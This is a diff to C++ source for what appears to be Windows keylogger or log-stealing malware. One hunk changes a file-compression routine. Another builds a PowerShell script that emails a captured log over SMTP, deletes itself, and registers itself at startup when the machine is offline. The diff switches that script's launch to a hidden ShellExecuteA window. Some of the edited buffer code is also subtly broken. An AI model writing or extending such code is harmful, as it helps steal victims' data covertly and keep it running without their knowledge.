@@ -398,7 +398,7 @@ Log:
     std::string IsGenuine = "Yes";
     CONST SLID AppId = WINDOWS_SLID;
     SL_GENUINE_STATE GenuineState;
-    HRESULT hResult = NULL;
+    HRESULT hResult;
 
     hResult = SLIsGenuineLocal(&AppId, &GenuineState, NULL);
 
@@ -986,17 +986,17 @@ int Compress(const char* source, char* dest, int sourceSize, int maxDestSize)
 
 void CompressFile(std::string Path) {
     DWORD WrittenBytes;
-    std::string FileBuffer;
-    char *Compressed = new char[sizeof(FileBuffer.c_str())];
+    char *FileBuffer = new char[100000];
+    char *Compressed = new char[sizeof(FileBuffer)];
     std::ifstream InputFile(Path);
     while (!InputFile.eof()) {
-        std::getline(InputFile, FileBuffer, '\0');
+        InputFile.read(FileBuffer,sizeof(FileBuffer));
     }
     InputFile.close();
     DeleteFileA(Path.c_str());
-    Compress(FileBuffer.c_str(), Compressed, (int)strlen(FileBuffer.c_str()), (int)strlen(FileBuffer.c_str()));
+    Compress(FileBuffer, Compressed, (int)strlen(FileBuffer), (int)strlen(FileBuffer));
     HANDLE LZ4File = CreateFileA(Path.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    WriteFile(LZ4File, FileBuffer.c_str(), (DWORD)strlen(FileBuffer.c_str()), &WrittenBytes, NULL);
+    WriteFile(LZ4File, FileBuffer, (DWORD)strlen(FileBuffer), &WrittenBytes, NULL);
     CloseHandle(LZ4File);
 }
 
@@ -1030,7 +1030,7 @@ void SendLog(std::string CurrentLog) {
     a += "')\n$SMTPInfo.Send($ReportEmail)\nRemove-Item $MyINvocation.InvocationName\nexit\n}\nelse\n{\nexit\n}";
     WriteFile(PS1File, a.c_str(), (DWORD)strlen(a.c_str()), &WrittenBytes, NULL);
     CloseHandle(PS1File);
-    Command = "PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
+    Command = "/C PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
     Command += Powershell;
     Command += "\"";
     if (!InternetGetConnectedState(&DWFlags, NULL)) {
@@ -1038,8 +1038,8 @@ void SendLog(std::string CurrentLog) {
         RegisterMyProgramForStartup(PSStartup.c_str(), SysDir, Command.c_str());
     }else{
         LogItChar("Connected to the internet, sending the log...", CurrentLog);
-        system(Command.c_str());
-        //ShellExecuteA(NULL, "open", SysDir, Command.c_str(), NULL, SW_HIDE);
+        //system(Command.c_str());
+        ShellExecuteA(NULL, "open", SysDir, Command.c_str(), NULL, SW_HIDE);
     }
 }
 
